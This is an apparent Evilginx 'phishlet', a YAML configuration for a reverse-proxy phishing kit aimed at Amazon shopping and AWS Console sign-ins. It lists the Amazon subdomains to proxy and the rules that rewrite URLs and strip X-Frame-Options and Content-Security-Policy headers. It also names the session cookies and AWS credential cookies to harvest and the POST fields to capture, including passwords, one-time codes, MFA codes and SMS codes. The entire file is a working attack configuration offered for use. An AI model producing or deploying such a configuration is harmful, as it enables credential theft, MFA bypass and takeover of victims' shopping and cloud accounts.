min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://www.amazon.com/'

proxy_hosts:
  # Amazon Shopping domains
  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'signin', orig_sub: 'signin', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'completion', orig_sub: 'completion', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  
  # AWS Console domains
  - {phish_sub: 'console', orig_sub: 'console', domain: 'aws.amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'signin', orig_sub: 'signin', domain: 'aws.amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'us-east-1.console', orig_sub: 'us-east-1.console', domain: 'aws.amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'us-west-2.console', orig_sub: 'us-west-2.console', domain: 'aws.amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'eu-west-1.console', orig_sub: 'eu-west-1.console', domain: 'aws.amazon.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Amazon Shopping domain URLs
  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'https://www\\.amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.amazon.com', orig_sub: 'signin', domain: 'amazon.com', search: 'https://signin\\.amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.amazon.com', orig_sub: 'completion', domain: 'amazon.com', search: 'https://completion\\.amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'www.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'https://fls-na\\.amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Replace Amazon CDN URLs
  - {triggers_on: 'www.amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'https://images-na\\.ssl-images-amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'https://[a-z0-9-]+\\.ssl-images-amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Replace AWS Console domain URLs
  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'console', domain: 'aws.amazon.com', search: 'https://console\\.aws\\.amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'signin', domain: 'aws.amazon.com', search: 'https://signin\\.aws\\.amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'us-east-1.console', domain: 'aws.amazon.com', search: 'https://us-east-1\\.console\\.aws\\.amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'us-west-2.console', domain: 'aws.amazon.com', search: 'https://us-west-2\\.console\\.aws\\.amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'eu-west-1.console', domain: 'aws.amazon.com', search: 'https://eu-west-1\\.console\\.aws\\.amazon\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json']}
  
  # Remove security headers
  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.amazon.com', orig_sub: 'signin', domain: 'amazon.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'console', domain: 'aws.amazon.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'console.aws.amazon.com', orig_sub: 'console', domain: 'aws.amazon.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Amazon Shopping authentication cookies
  - domain: '.amazon.com'
    keys: ['session-id', 'session-id-time', 'ubid-main', 'x-main', 'at-main', 'sess-at-main', 'sst-main']
    type: 'cookie'
  
  - domain: '.amazon.com'
    keys: ['session-token', 'csm-hit', 'lc-main', 'sp-cdn', 'skin']
    type: 'cookie'
    optional: true
  
  # AWS Console authentication cookies
  - domain: '.aws.amazon.com'
    keys: ['aws-userInfo', 'aws-creds', 'JSESSIONID', 'aws-ubid-main', 'aws-at-main', 'noflush_awsccs_sid']
    type: 'cookie'
  
  - domain: '.aws.amazon.com'
    keys: ['aws_lang', 'awsc-color-theme', 'awsc-uh-opt-in', 'awsc-consoleInfo']
    type: 'cookie'
    optional: true
  
  # AWS session tokens
  - domain: '.amazonaws.com'
    keys: ['aws-session-token', 'aws-access-key-id', 'aws-secret-access-key']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative phone number login
  phone:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # MFA/OTP codes
  otp_code:
    key: 'otpCode'
    search: '(.*)'
    type: 'post'
  
  mfa_code:
    key: 'mfaCode'
    search: '(.*)'
    type: 'post'
  
  # SMS verification code
  sms_code:
    key: 'code'
    search: '(.*)'
    type: 'post'
  
  # AWS-specific credentials
  aws_username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  aws_password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  aws_account_id:
    key: 'account'
    search: '(.*)'
    type: 'post'

auth_urls:
  # Amazon Shopping
  - '/ap/signin'
  - '/gp/css/homepage.html'
  - '/gp/yourstore/home'
  - '/gp/cart/view.html'
  
  # AWS Console
  - '/console/home'
  - '/ec2/'
  - '/s3/'
  - '/iam/'
  - '/cloudformation/'
  - '/lambda/'

login:
  domain: 'www.amazon.com'
  path: '/ap/signin'

